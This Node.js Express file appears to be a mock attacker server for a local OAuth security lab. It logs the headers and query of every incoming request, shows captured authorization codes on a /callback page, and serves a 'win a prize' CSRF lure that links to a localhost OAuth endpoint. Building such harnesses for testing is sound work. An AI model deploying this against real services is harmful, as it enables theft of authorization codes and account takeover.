const express = require('express');
const cors = require('cors');

const app = express();
app.use(cors());

const PORT = 6666;

app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.use((req, res, next) => {
    console.log(`[Attacker] Incoming ${req.method} request to ${req.url}`);
    console.log('Headers:', req.headers);
    console.log('Query:', req.query);
    next();
});

app.get('/callback', (req, res) => {
    res.send(`
        <h1>Attacker Site</h1>
        <p>Thanks for the code!</p>
        <pre>${JSON.stringify(req.query, null, 2)}</pre>
    `);
});

app.get('/exploit', (req, res) => {
    // Basic CSRF exploit template
    res.send(`
        <h1>Attacker Exploit Page</h1>
        <p>Click <a href="http://localhost:9090/api/v2/login/oauth">here</a> to win a prize!</p>
        <!-- Auto submit script could go here -->
    `);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Attacker Service running on port ${PORT}`);
});
